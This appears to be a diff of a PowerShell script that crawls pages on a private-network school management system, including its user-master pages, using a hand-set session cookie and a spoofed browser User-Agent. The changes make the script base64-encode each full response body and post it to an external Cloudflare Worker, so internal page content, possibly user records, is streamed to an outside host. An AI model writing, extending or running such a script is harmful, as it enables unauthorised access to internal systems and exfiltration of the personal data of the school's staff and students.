@@ -1,78 +1,72 @@
 # --- Configuration ---
-$BaseUrl = "http://192.168.29.20"
-$WorkerUrl = "https://wispy-sunset-a7c0.anox.workers.dev/cskm"
-$UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
-$Cookie = "fy=2025; userno=1; lock=none; usernoT=; fyT=;"
+$BaseUrl    = "http://192.168.29.20"
+$WorkerUrl  = "https://wispy-sunset-a7c0.anox.workers.dev/cskm"
+$UserAgent  = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+$Cookie     = "fy=2025; userno=1; lock=none; usernoT=; fyT=;"
+$LogFile    = Join-Path $env:TEMP "crawl_results_$(Get-Date -Format 'yyyyMMdd_HHmm').json"
 
 $Paths = @(
     "/",
-    "/pay-fees-details-v3.0.php?f=app&fy=2025&adm_no=19349",
     "/schoolexpert",
     "/schoolexpert/mstrUsers.php",
     "/schoolexpert/mstrUsers.asp"
 )
 
-# Headers setup
 $Headers = @{
     "User-Agent" = $UserAgent
     "Cookie"     = $Cookie
 }
 
-Write-Host "Starting URL processing..."
+# Container for all results
+$AllResults = @()
+
+Write-Host "Starting Crawl: $BaseUrl" -ForegroundColor Cyan
 
 foreach ($Path in $Paths) {
     $FullUrl = "$BaseUrl$Path"
-    $Timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
-    $SafeName = $Path -replace '[^a-zA-Z0-9]', '_'
-    $TempFilePath = Join-Path $env:TEMP "resp_$($SafeName)_$($Timestamp).tmp"
-
-    $Report = @{
+    
+    $Entry = [ordered]@{
         url         = $FullUrl
-        path        = $Path
         timestamp   = (Get-Date).ToString("o")
         status_code = 0
-        local_file  = $TempFilePath
         success     = $false
-        content_len = 0
+        base64_body = ""
+        error       = ""
     }
 
     try {
-        # Perform request
         $Response = Invoke-WebRequest -Uri $FullUrl -Headers $Headers -Method Get -UseBasicParsing -TimeoutSec 15 -ErrorAction Stop
         
-        $Report.status_code = [int]$Response.StatusCode
-        $Report.success = $true
-        $Report.content_len = $Response.Content.Length
+        $Entry.status_code = [int]$Response.StatusCode
+        $Entry.success     = $true
         
-        # Save full response to local temp file
-        $FileContent = @{
-            url     = $FullUrl
-            headers = $Response.Headers
-            raw_body = $Response.Content
-        } | ConvertTo-Json -Depth 10
+        # Encode HTML content to Base64
+        $Bytes            = [System.Text.Encoding]::UTF8.GetBytes($Response.Content)
+        $Entry.base64_body = [Convert]::ToBase64String($Bytes)
         
-        $FileContent | Set-Content -Path $TempFilePath
-        Write-Host "Success: $FullUrl -> $TempFilePath"
-
+        Write-Host "OK: $Path" -ForegroundColor Green
     } catch {
-        $Report.success = $false
+        $Entry.success = $false
+        $Entry.error   = $_.Exception.Message
         if ($_.Exception.Response) {
-            $Report.status_code = [int]$_.Exception.Response.StatusCode
+            $Entry.status_code = [int]$_.Exception.Response.StatusCode
         }
-        $Report.error = $_.Exception.Message
-        
-        # Save error details to local temp file
-        $_.Exception.Message | Set-Content -Path $TempFilePath
-        Write-Host "Failed: $FullUrl"
+        Write-Host "FAIL: $Path" -ForegroundColor Red
     }
 
-    # Post results to Cloudflare Worker
+    $AllResults += $Entry
+
+    # Post individual result to Worker immediately (Stream mode)
     try {
-        $JsonReport = $Report | ConvertTo-Json
-        Invoke-RestMethod -Uri $WorkerUrl -Method Post -Body $JsonReport -ContentType "application/json"
+        $JsonEntry = $Entry | ConvertTo-Json -Depth 10
+        Invoke-RestMethod -Uri $WorkerUrl -Method Post -Body $JsonEntry -ContentType "application/json"
     } catch {
-        Write-Host "Worker logging failed for $FullUrl"
+        Write-Host "Worker Post Failed for $Path" -ForegroundColor Yellow
     }
 }
 
-Write-Host "Batch complete."
+# Write all results to the single local JSON file
+$AllResults | ConvertTo-Json -Depth 10 | Set-Content -Path $LogFile
+
+Write-Host "`nComplete." -ForegroundColor Cyan
+Write-Host "Local Log: $LogFile"
